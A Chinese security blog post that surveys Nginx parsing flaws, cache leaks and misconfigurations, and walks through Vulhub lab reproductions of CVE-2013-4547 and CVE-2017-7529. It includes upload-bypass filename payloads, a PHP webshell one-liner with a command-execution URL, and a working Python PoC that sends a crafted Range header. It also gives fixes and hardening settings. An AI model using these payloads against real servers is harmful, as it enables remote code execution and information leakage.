href="/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>中间件</span></a><a class="article-meta__tags" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>渗透测试</span></a></span></div></div><h1 class="post-title" itemprop="name headline">Nginx常见安全漏洞</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2025-03-26T16:00:00.000Z" title="发表于 2025-03-27 00:00:00">2025-03-27</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2025-03-27T17:24:36.538Z" title="更新于 2025-03-28 01:24:36">2025-03-28</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-wordcount"><i class="anzhiyufont anzhiyu-icon-file-word post-meta-icon" title="文章字数"></i><span class="post-meta-label" title="文章字数">字数总计:</span><span class="word-count" title="文章字数">2.5k</span><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-clock post-meta-icon" title="阅读时长"></i><span class="post-meta-label" title="阅读时长">阅读时长:</span><span>8分钟</span></span><span class="post-meta-separator"></span><span class="post-meta-pv-cv" id="" data-flag-title="Nginx常见安全漏洞"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" title="阅读量">阅读量:</span><span id="busuanzi_value_page_pv"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为长安"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>长安</span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/nginx01.png"></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><div class="post-ai-description"><div class="ai-title"><i class="anzhiyufont anzhiyu-icon-bilibili"></i><div class="ai-title-text">AI-摘要</div><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right"></i><i class="anzhiyufont anzhiyu-icon-circle-dot" title="朗读摘要"></i><div id="ai-tag">GPT-4.0-turbo GPT</div></div><div class="ai-explanation">AI初始化中...</div><div class="ai-btn-box"><div class="ai-btn-item">介绍自己 🙈</div><div class="ai-btn-item">生成本文简介 👋</div><div class="ai-btn-item">推荐相关文章 📖</div><div class="ai-btn-item">前往主页 🏠</div><div class="ai-btn-item" id="go-tianli-blog">前往爱发电购买</div></div><script data-pjax src="/js/anzhiyu/ai_abstract.js"></script></div><article class="post-content" id="article-container" itemscope itemtype="https://blog.takake.com/posts/18454/"><header><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url">网络安全</a><a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" tabindex="-1" itemprop="url">漏洞复现</a><a href="/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6/" tabindex="-1" itemprop="url">中间件</a><a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" tabindex="-1" itemprop="url">渗透测试</a><h1 id="CrawlerTitle" itemprop="name headline">Nginx常见安全漏洞</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">Takake</span><time itemprop="dateCreated datePublished" datetime="2025-03-26T16:00:00.000Z" title="发表于 2025-03-27 00:00:00">2025-03-27</time><time itemprop="dateCreated datePublished" datetime="2025-03-27T17:24:36.538Z" title="更新于 2025-03-28 01:24:36">2025-03-28</time></header><p>以下是Nginx常见的历史漏洞及配置错误导致的安全问题，按类型和影响分类整理：</p>
+<hr>
+<h2 id="一、解析类漏洞"><a href="#一、解析类漏洞" class="headerlink" title="一、解析类漏洞"></a>一、解析类漏洞</h2><ol>
+<li><strong>文件名逻辑漏洞（CVE-2013-4547）</strong>  <ul>
+<li><strong>影响版本</strong>：Nginx 0.8.41<del>1.4.3 &#x2F; 1.5.0</del>1.5.7  </li>
+<li><strong>原理</strong>：错误解析URI中的空格（<code>0x20</code>）和空字节（<code>0x00</code>），导致攻击者可通过构造文件名（如<code>1.jpg[空格][空字节].php</code>）绕过安全检查，使非PHP文件被解析为PHP执行。  </li>
+<li><strong>利用场景</strong>：上传恶意文件后，通过修改请求头触发解析漏洞。</li>
+</ul>
+</li>
+<li><strong>配置不当导致的PHP解析漏洞</strong>  <ul>
+<li><strong>影响范围</strong>：与Nginx和PHP版本无关，因<code>cgi.fix_pathinfo</code>默认开启（值为1）。  </li>
+<li><strong>原理</strong>：Nginx将<code>.php</code>结尾的请求直接转发给PHP处理，即使文件路径中<code>.php</code>部分不存在。例如，访问<code>/test.jpg/.php</code>时，<code>test.jpg</code>会被当作PHP解析。</li>
+</ul>
+</li>
+<li><strong>%00截断解析漏洞</strong>  <ul>
+<li><strong>影响版本</strong>：Nginx 0.5.x、0.6.x、0.7≤0.7.65、0.8≤0.8.37  </li>
+<li><strong>原理</strong>：利用URL中的空字节（<code>%00</code>）截断路径解析，例如访问<code>/test.jpg%00.php</code>，使非PHP文件被解析。</li>
+</ul>
+</li>
+<li>总结</li>
+</ol>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.上传 1.jpg[0x20][0x00].php 解析1.jpg[0x20][0x00].php</span><br><span class="line">/test.jpg/.php</span><br><span class="line">/test.jpg%00.php</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="二、缓存与信息泄露漏洞"><a href="#二、缓存与信息泄露漏洞" class="headerlink" title="二、缓存与信息泄露漏洞"></a>二、缓存与信息泄露漏洞</h2><ol>
+<li><strong>越界读取缓存漏洞（CVE-2017-7529）</strong>  <ul>
+<li><strong>影响版本</strong>：Nginx 0.5.6~1.13.2  </li>
+<li><strong>原理</strong>：当Nginx作为反向代理并开启缓存时，攻击者可通过构造恶意<code>Range</code>请求头读取缓存文件的头部信息，泄露敏感数据（如后端服务器信息）。  </li>
+<li><strong>修复建议</strong>：升级至安全版本，禁用不必要的缓存功能。</li>
+</ul>
+</li>
+</ol>
+<hr>
+<h2 id="三、配置错误导致的漏洞"><a href="#三、配置错误导致的漏洞" class="headerlink" title="三、配置错误导致的漏洞"></a>三、配置错误导致的漏洞</h2><ol>
+<li><p><strong>CRLF注入漏洞（HTTP响应头注入）</strong>  </p>
+<ul>
+<li><strong>原理</strong>：错误使用<code>$uri</code>变量（解码后的URI）导致换行符（<code>%0d%0a</code>）注入响应头，可插入恶意Cookie或XSS代码。例如配置<code>return 302 https://$host$uri</code>时，攻击者通过<code>/%0d%0aSet-Cookie:...</code>篡改响应头。  </li>
+<li><strong>修复方案</strong>：改用<code>$request_uri</code>（未解码的原始URI）。</li>
+</ul>
+</li>
+<li><p><strong>目录穿越漏洞</strong>  </p>
+<ul>
+<li><strong>原理</strong>：错误配置<code>alias</code>指令导致路径穿越。例如，<code>location /files &#123; alias /home/; &#125;</code>允许通过<code>/files../</code>访问上级目录，造成任意文件下载。  </li>
+<li><strong>修复方案</strong>：确保<code>alias</code>路径与<code>location</code>匹配（如末尾添加<code>/</code>）。</li>
+</ul>
+</li>
+<li><p><strong>HTTP头覆盖漏洞</strong>  </p>
+<ul>
+<li><strong>原理</strong>：子配置块（如<code>location</code>）中的<code>add_header</code>指令覆盖父块配置，导致安全头（如CSP、X-Frame-Options）失效。例如父块设置CSP防御XSS，但子块未继承该配置。  </li>
+<li><strong>修复方案</strong>：在子块中显式继承父块的安全头配置。</li>
+</ul>
+</li>
+</ol>
+<hr>
+<h2 id="四、其他安全配置问题"><a href="#四、其他安全配置问题" class="headerlink" title="四、其他安全配置问题"></a>四、其他安全配置问题</h2><ol>
+<li><p><strong>Host头攻击</strong>  </p>
+<ul>
+<li><strong>风险</strong>：未校验<code>Host</code>头可能导致恶意域名指向、缓存污染或SSRF。  </li>
+<li><strong>修复方案</strong>：配置<code>server_name</code>白名单并拦截非法<code>Host</code>请求。</li>
+</ul>
+</li>
+<li><p><strong>安全响应头缺失</strong>  </p>
+<ul>
+<li><strong>常见问题</strong>：未配置<code>X-Frame-Options</code>（防御点击劫持）、<code>X-Content-Type-Options</code>（禁用MIME嗅探）、<code>Content-Security-Policy</code>（防御XSS）等。  </li>
+<li><strong>修复示例</strong>：  <figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">add_header</span> X-Frame-Options <span class="string">&quot;SAMEORIGIN&quot;</span>;</span><br><span class="line"><span class="attribute">add_header</span> X-Content-Type-Options <span class="string">&quot;nosniff&quot;</span>;</span><br><span class="line"><span class="attribute">add_header</span> Content-Security-Policy <span class="string">&quot;default-src &#x27;self&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+</ol>
+<hr>
+<h2 id="五-文件名逻辑漏洞（CVE-2013-4547）"><a href="#五-文件名逻辑漏洞（CVE-2013-4547）" class="headerlink" title="五.文件名逻辑漏洞（CVE-2013-4547）"></a>五.文件名逻辑漏洞（CVE-2013-4547）</h2><p>以下是针对 <strong>Nginx文件名逻辑漏洞（CVE-2013-4547）</strong> 的Vulhub复现流程，结合漏洞原理与利用步骤整理：</p>
+<hr>
+<h3 id="1-漏洞原理"><a href="#1-漏洞原理" class="headerlink" title="1. 漏洞原理"></a><strong>1. 漏洞原理</strong></h3><ul>
+<li><strong>影响版本</strong>：Nginx 0.8.41<del>1.4.3 和 1.5.0</del>1.5.7。</li>
+<li><strong>漏洞成因</strong>：Nginx解析URI时，错误处理空格（<code>0x20</code>）和空字节（<code>0x00</code>），导致非PHP文件（如图片）被当作PHP解析。例如，请求<code>1.jpg[0x20][0x00].php</code>时，Nginx匹配<code>.php$</code>正则，但实际处理文件名<code>1.jpg[0x20]</code>（被<code>0x00</code>截断），并发送给PHP-FPM解析，绕过安全限制。</li>
+</ul>
+<hr>
+<h3 id="2-环境搭建"><a href="#2-环境搭建" class="headerlink" title="2. 环境搭建"></a><strong>2. 环境搭建</strong></h3><ol>
+<li><p><strong>启动Vulhub漏洞环境</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> vulhub/nginx/CVE-2013-4547</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+<p>访问 <code>http://your-ip:8080</code> 确认环境启动成功。</p>
+</li>
+</ol>
+<hr>
+<h3 id="3-漏洞复现步骤"><a href="#3-漏洞复现步骤" class="headerlink" title="3. 漏洞复现步骤"></a><strong>3. 漏洞复现步骤</strong></h3><h4 id="步骤1：上传恶意文件"><a href="#步骤1：上传恶意文件" class="headerlink" title="步骤1：上传恶意文件"></a><strong>步骤1：上传恶意文件</strong></h4><ul>
+<li><p><strong>创建图片马</strong>：生成一个包含PHP代码的图片文件（如<code>test.jpg</code>）（直接修改文本文件名后缀即可），内容示例：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>(); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>使用<code>GIF89a</code>头伪装为合法图片，绕过上传检测。</p>
+</li>
+<li><p><strong>上传文件</strong>：通过网页上传接口上传<code>test.jpg</code>，<strong>文件名需包含空格</strong>（如<code>test.jpg </code>）。</p>
+</li>
+</ul>
+<h4 id="步骤2：Burp拦截与修改请求"><a href="#步骤2：Burp拦截与修改请求" class="headerlink" title="步骤2：Burp拦截与修改请求"></a><strong>步骤2：Burp拦截与修改请求</strong></h4><ol>
+<li><p><strong>拦截上传请求</strong>：使用Burp Suite抓取上传数据包。</p>
+</li>
+<li><p><strong>修改文件名</strong>：在Burp的Hex视图中，将文件名末尾的<strong>两个空格</strong>（<code>0x20 0x20</code>）改为<strong>一个空格和一个空字节</strong>（<code>0x20 0x00</code>）。</p>
+<ul>
+<li><strong>示例</strong>：<code>test.jpg  .php</code> → <code>test.jpg\x20\x00.php</code>。</li>
+</ul>
+</li>
+<li><p><strong>发送修改后的请求</strong>：上传成功后，文件路径为<code>/uploadfiles/test.jpg</code>。</p>
+</li>
+</ol>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/markdown-img/image-20250327231606210.png?x-oss-process=style/img-to-webp" alt="image-20250327231606210"></p>
+<h4 id="步骤3：触发解析漏洞"><a href="#步骤3：触发解析漏洞" class="headerlink" title="步骤3：触发解析漏洞"></a><strong>步骤3：触发解析漏洞</strong></h4><ul>
+<li><p><strong>构造恶意请求</strong>：访问以下URL，触发Nginx解析漏洞：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://your-ip:8080/uploadfiles/test.jpg[0x20][0x00].php</span><br></pre></td></tr></table></figure>
+<p>需通过Burp抓取该请求，并确保路径中包含空格与空字节的十六进制编码。</p>
+</li>
+<li><p><strong>验证执行</strong>：若成功，页面将显示<code>phpinfo()</code>信息，证明非PHP文件被解析为PHP代码。</p>
+</li>
+</ul>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/markdown-img/image-20250327231756601.png?x-oss-process=style/img-to-webp" alt="image-20250327231756601"></p>
+<hr>
+<h3 id="4-高级利用（如命令执行）"><a href="#4-高级利用（如命令执行）" class="headerlink" title="4. 高级利用（如命令执行）"></a><strong>4. 高级利用（如命令执行）</strong></h3><ul>
+<li><strong>上传Webshell</strong>：将图片马中的代码替换为Webshell（如<code>&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;</code>）。</li>
+<li><strong>执行命令</strong>：访问<code>http://your-ip:8080/uploadfiles/test.jpg%20%00.php?cmd=id</code>，可执行系统命令。</li>
+</ul>
+<hr>
+<h3 id="5-注意事项"><a href="#5-注意事项" class="headerlink" title="5. 注意事项"></a><strong>5. 注意事项</strong></h3><ol>
+<li><strong>文件名长度</strong>：尽量缩短文件名，避免Hex修改时出错。</li>
+<li><strong>环境差异</strong>：<ul>
+<li><strong>Linux</strong>：需确保上传文件名包含空格（如<code>test.jpg </code>）。</li>
+<li><strong>Windows</strong>：系统自动忽略文件名末尾空格，上传普通文件名即可利用。</li>
+</ul>
+</li>
+<li><strong>PHP-FPM配置</strong>：需满足<code>security.limit_extensions</code>为空（默认仅允许<code>.php</code>），否则漏洞无法触发。</li>
+</ol>
+<hr>
+<h3 id="6-漏洞修复建议"><a href="#6-漏洞修复建议" class="headerlink" title="6. 漏洞修复建议"></a><strong>6. 漏洞修复建议</strong></h3><ol>
+<li><strong>升级Nginx</strong>至安全版本（≥1.4.4或1.5.8）。</li>
+<li><strong>过滤特殊字符</strong>：禁止文件名包含空格或空字节。</li>
+<li><strong>重命名上传文件</strong>：避免保留用户输入的文件名。</li>
+</ol>
+<hr>
+<h3 id="7-总结"><a href="#7-总结" class="headerlink" title="7. 总结"></a>7. <strong>总结</strong></h3><p>该漏洞利用Nginx对URI解析的缺陷，通过构造含空格与空字节的文件名绕过安全检测。复现时需注意环境配置与请求修改的细节。更多技术细节可参考Vulhub官方文档及上述复现案例。</p>
+<h2 id="六-越界读取缓存漏洞（CVE-2017-7529）"><a href="#六-越界读取缓存漏洞（CVE-2017-7529）" class="headerlink" title="六. 越界读取缓存漏洞（CVE-2017-7529）"></a>六. 越界读取缓存漏洞（CVE-2017-7529）</h2><p>以下是针对 <strong>Nginx越界读取缓存漏洞（CVE-2017-7529）</strong> 的Vulhub复现流程及技术分析，结合漏洞原理与利用步骤整理：</p>
+<hr>
+<h3 id="1-漏洞原理-1"><a href="#1-漏洞原理-1" class="headerlink" title="1. 漏洞原理"></a><strong>1. 漏洞原理</strong></h3><ul>
+<li><strong>影响版本</strong>：Nginx 0.5.6 ~ 1.13.2。</li>
+<li><strong>漏洞成因</strong>：当Nginx作为反向代理并开启缓存时，缓存文件包含 <strong>文件头（含后端服务器信息）+ HTTP返回包头 + HTTP返回包体</strong>。攻击者通过构造包含恶意<code>Range</code>头的请求，利用整数溢出漏洞使Nginx读取缓存文件的头部信息（如后端IP、配置敏感信息）。</li>
+<li><strong>关键点</strong>：<code>Range</code>头中的负值偏移导致Nginx越界读取缓存文件的头部内容。</li>
+</ul>
+<hr>
+<h3 id="2-环境搭建-1"><a href="#2-环境搭建-1" class="headerlink" title="2. 环境搭建"></a><strong>2. 环境搭建</strong></h3><ol>
+<li><strong>启动Vulhub漏洞环境</strong>：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> vulhub/nginx/CVE-2017-7529</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+访问 <code>http://your-ip:8080</code> 确认环境正常运行（显示Nginx默认页面）。</li>
+</ol>
+<hr>
+<h3 id="3-漏洞复现步骤-1"><a href="#3-漏洞复现步骤-1" class="headerlink" title="3. 漏洞复现步骤"></a><strong>3. 漏洞复现步骤</strong></h3><h4 id="步骤1：获取POC脚本"><a href="#步骤1：获取POC脚本" class="headerlink" title="步骤1：获取POC脚本"></a><strong>步骤1：获取POC脚本</strong></h4><p>Vulhub环境自带POC脚本（<code>poc.py</code>），或从搜索结果中复制以下代码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;%s url&quot;</span> % (sys.argv[<span class="number">0</span>]))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;eg: python %s http://your-ip:8080/&quot;</span> % (sys.argv[<span class="number">0</span>]))</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">offset = <span class="number">605</span></span><br><span class="line">url = sys.argv[<span class="number">1</span>]</span><br><span class="line">file_len = <span class="built_in">len</span>(requests.get(url, headers=headers).content)</span><br><span class="line">n = file_len + offset</span><br><span class="line">headers[<span class="string">&#x27;Range&#x27;</span>] = <span class="string">&quot;bytes=-%d,-%d&quot;</span> % (</span><br><span class="line">    n, <span class="number">0x8000000000000000</span> - n)</span><br><span class="line"></span><br><span class="line">r = requests.get(url, headers=headers)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>
+
+<h4 id="步骤2：执行POC脚本"><a href="#步骤2：执行POC脚本" class="headerlink" title="步骤2：执行POC脚本"></a><strong>步骤2：执行POC脚本</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 poc.py http://your-ip:8080/</span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>脚本逻辑</strong>：<ol>
+<li>获取目标URL的原始响应长度（<code>file_len</code>）。</li>
+<li>计算偏移量 <code>n = file_len + offset</code>（默认<code>offset=605</code>）。</li>
+<li>构造恶意<code>Range</code>头：<code>bytes=-X,-Y</code>，其中 <code>X = n</code>，<code>Y = 0x8000000000000000 - n</code>，触发整数溢出，使Nginx读取缓存文件头部。</li>
+</ol>
+</li>
+</ul>
+<h4 id="步骤3：验证漏洞利用"><a href="#步骤3：验证漏洞利用" class="headerlink" title="步骤3：验证漏洞利用"></a><strong>步骤3：验证漏洞利用</strong></h4><ul>
+<li><strong>成功表现</strong>：返回内容中包含缓存文件头信息（如<code>X-Proxy-Cache</code>状态、后端服务器IP或端口）。</li>
+<li><strong>示例输出</strong>：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">KEY: http://127.0.0.1:8081/</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: nginx/1.13.2</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure></li>
+</ul>
+<hr>
+<h3 id="4-高级利用与调试"><a href="#4-高级利用与调试" class="headerlink" title="4. 高级利用与调试"></a><strong>4. 高级利用与调试</strong></h3><ol>
+<li><strong>调整偏移量</strong>：<ul>
+<li>若默认<code>offset=605</code>未成功，可手动调整偏移值（如<code>addnum=320</code>），确保<code>Range</code>范围覆盖缓存文件头部。</li>
+</ul>
+</li>
+<li><strong>多段Range构造</strong>：<ul>
+<li>构造多个负值Range（如<code>bytes=-600,-9223372036854774591</code>），尝试读取不同位置的敏感数据。</li>
+</ul>
+</li>
+</ol>
+<hr>
+<h3 id="5-注意事项-1"><a href="#5-注意事项-1" class="headerlink" title="5. 注意事项"></a><strong>5. 注意事项</strong></h3><ol>
+<li><strong>缓存配置要求</strong>：<ul>
+<li>Nginx需启用反向代理缓存（默认Vulhub环境已配置）。</li>
+<li>若未命中缓存，需多次访问目标URL以生成缓存文件。</li>
+</ul>
+</li>
+<li><strong>响应状态码</strong>：<ul>
+<li>成功利用时返回状态码<code>206</code>（Partial Content），失败则返回<code>200</code>或<code>416</code>。</li>
+</ul>
+</li>
+</ol>
+<hr>
+<h3 id="6-漏洞修复建议-1"><a href="#6-漏洞修复建议-1" class="headerlink" title="6. 漏洞修复建议"></a><strong>6. 漏洞修复建议</strong></h3><ol>
+<li><strong>升级Nginx</strong>至安全版本（≥1.13.3或1.12.1）。</li>
+<li><strong>关闭代理缓存</strong>（非必要场景）：<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">proxy_cache</span> <span class="literal">off</span>;</span><br></pre></td></tr></table></figure></li>
+<li><strong>限制Range请求范围</strong>：通过配置限制<code>Range</code>头的合法性。</li>
+</ol>
+<hr>
+<h3 id="7-总结-1"><a href="#7-总结-1" class="headerlink" title="7. 总结"></a>7. <strong>总结</strong></h3><p>CVE-2017-7529的复现核心在于构造恶意<code>Range</code>头触发缓存文件越界读取。利用Vulhub环境可快速验证漏洞，实际渗透中需结合目标配置调整偏移量。修复时建议优先升级版本或关闭高风险功能。更多细节可参考Vulhub官方文档及上述技术分析。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>Nginx的安全问题主要分为三类：  </p>
+<ol>
+<li><strong>代码解析漏洞</strong>（如CVE-2013-4547、CVE-2017-7529）。  </li>
+<li><strong>配置不当漏洞</strong>（如CRLF注入、目录穿越）。  </li>
+<li><strong>安全头缺失或覆盖</strong>（如CSP、X-Frame-Options）。</li>
+</ol>
+<p><strong>建议措施</strong>：定期升级Nginx版本、严格校验配置（如使用<code>$request_uri</code>替代<code>$uri</code>）、启用必要安全响应头，并限制文件上传与解析逻辑。更多细节可参考各漏洞的复现环境（如Vulhub）及官方文档。</p>
+</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/avtor.png?x-oss-process=style/img-to-webp" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/avtor.png?x-oss-process=style/img-to-webp" title="头像" alt="头像"></a><div class="post-copyright__author_name">Takake</div><div class="post-copyright__author_desc"></div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="https://blog.takake.com/posts/18454/">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('https://blog.takake.com/posts/18454/')">Nginx常见安全漏洞</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"><div class="post-reward" onclick="anzhiyu.addRewardMask()"><div class="reward-button button--animated" title="赞赏作者"><i class="anzhiyufont anzhiyu-icon-hand-heart-fill"></i>打赏作者</div><div class="reward-main"><div class="reward-all"><span class="reward-title">感谢你赐予我前进的力量</span><ul class="reward-group"><li class="reward-item"><a href="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/red_cross.png?x-oss-process=style/img-to-webp" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/red_cross.png?x-oss-process=style/img-to-webp" alt="红十字会"/></a><div class="post-qr-code-desc">红十字会</div></li><li class="reward-item"><a href="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/logo.png?x-oss-process=style/img-to-webp" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/logo.png?x-oss-process=style/img-to-webp" alt="LOGO"/></a><div class="post-qr-code-desc">LOGO</div></li></ul><a class="reward-main-btn" href="/about/#about-reward" target="_blank"><div class="reward-text">赞赏者名单</div><div class="reward-dec">因为你们的支持让我意识到写文章的价值🙏</div></a></div></div></div><div id="quit-box" onclick="anzhiyu.removeRewardMask()" style="display: none"></div></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="https://blog.takake.com/posts/18454/"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=Nginx常见安全漏洞&amp;url=https://blog.takake.com/posts/18454/&amp;pic=https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/nginx01.png" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
+  var currentPageUrl = window.location.href;
+  var input = document.createElement("input");
+  input.setAttribute("value", currentPageUrl);
+  document.body.appendChild(input);
+  input.select();
+  input.setSelectionRange(0, 99999);
+  document.execCommand("copy");
+  document.body.removeChild(input);
